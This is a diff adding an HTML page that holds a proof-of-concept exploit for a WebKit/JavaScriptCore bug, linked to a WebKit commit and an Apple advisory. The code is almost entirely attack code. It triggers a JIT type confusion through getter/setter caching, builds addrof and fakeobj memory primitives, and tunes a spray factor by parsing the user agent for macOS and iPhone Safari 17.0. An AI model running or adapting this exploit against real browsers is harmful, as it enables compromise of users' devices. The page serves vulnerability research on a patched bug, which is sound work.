@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="util.js"></script>
+<script src="int64.js"></script>
+    <title>Document</title>
+</head>
+<body>
+    <p id="factors">
+    </p>
+    <p id="status"></p>
+    <script>
+
+/*
+author: @po6ix
+commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
+advisory: https://support.apple.com/en-us/HT213926
+*/
+let boxed_arr = new Function();
+boxed_arr.p1 = 1.1;
+boxed_arr[0] = {};
+
+let getter = new Function();
+getter.p1 = 1.1;
+getter[0] = 1.1;
+
+let shape = {};
+for (let i = 0; i < 14; ++i) {
+    shape['p'+i] = i;
+}
+
+let shapes = [];
+for (let i = 0; i < 100; ++i) {
+    shapes.push({
+        ...shape,
+        ['z'+i]: 0x1337
+    });
+}
+
+function trigger(type) {
+    let object_a = {};
+    object_a.foo = 1;
+    object_a.p1 = 1.1;
+
+    let object_b = {};
+    object_b.__defineGetter__('p1', getter);
+    object_b.foo = 1;
+
+    function get_getterSetter(type) {
+        let o, retval;
+
+        if (type == 0) o = object_a;
+        else o = object_b;
+
+        for (let i = 0; i < 2; ++i) {
+            if (type == 0) retval = o.foo;
+            else retval = o.foo;
+        }
+        return retval;
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    for (let i = 0; i < 1e6; ++i) {
+        get_getterSetter(i % 2);
+    }
+    return [getter, get_getterSetter(1)];
+}
+
+(function pwn() {
+    let [getter, getterSetter] = trigger();
+    let success = false;
+    try {
+        getterSetter.toString();
+    } catch(e) {
+        // it should fail to call toString
+        success = true;
+    }
+    if (!success) {
+        document.getElementById("status").innerHTML = "Exploit failed.. Trying again!"
+        location.reload()
+        return;
+    }
+
+    let symbolObject = Object(getterSetter);
+
+    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
+    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
+    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
+    let factor;
+    let unknown_device = false;
+
+    if (isMac && version == '17.0') {
+        factor = 840;
+    } else if (isIphone && version == '17.0') {
+        factor = 87;
+    } else {
+        factor = 87 + Math.floor(Math.random() * 1000);
+        unknown_device = true;
+    }
+
+    let ref_arr = [];
+    for (let i = 0; i < factor; ++i) {
+        ref_arr.push(symbolObject.description);
+    }
+
+    getter.p13 = 1.1; // change the length of boxed_arr
+    let unboxed_arr = getter;
+    
+    function addrof(o) {
+        boxed_arr[8] = o;
+        return Int64.fromDouble(unboxed_arr[0]);
+    }
+
+    function fakeobj(addr) {
+        unboxed_arr[0] = addr.asDouble();
+        return boxed_arr[8];
+    }
+    
+    let sample = BigInt(addrof({}).toString());
+    if (sample >= 0x200000000 || sample < 0x100000000) {
+        // alert('failed');
+        location.reload();
+        return;
+    } else {
+        alert(`success!!!`);
+        if (unknown_device) {
+            alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isiPhone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
+            document.getElementById("status").innerHTML = "Success!"
+        }
+    }
+
+    alert(addrof({}).toString());
+    alert(addrof({}).toString());
+    alert(addrof({}).toString());
+    alert(addrof({}).toString());
+})();
+
+    </script>
+</body>
+</html>
